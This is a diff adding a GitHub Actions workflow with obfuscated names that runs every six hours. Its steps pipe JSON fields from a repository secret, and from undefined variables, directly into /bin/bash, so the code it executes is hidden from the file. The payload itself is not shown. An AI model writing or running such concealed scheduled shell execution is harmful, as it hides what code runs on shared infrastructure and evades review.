@@ -1,0 +1,21 @@
+name: jiagaoxiaqing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiagaoxiaqing
+        env:
+          tv58607: ${{ secrets.tv58607 }}
+        run: |
+          echo $tv58607 | jq -r .ot97487 | /bin/bash
+          echo $zg581 | jq -r .zgd88 | /bin/bash
+          echo $ymrvq648 | jq -r .rskkq7259 | /bin/bash
+          echo $xt472 | jq -r .g161 | /bin/bash
+
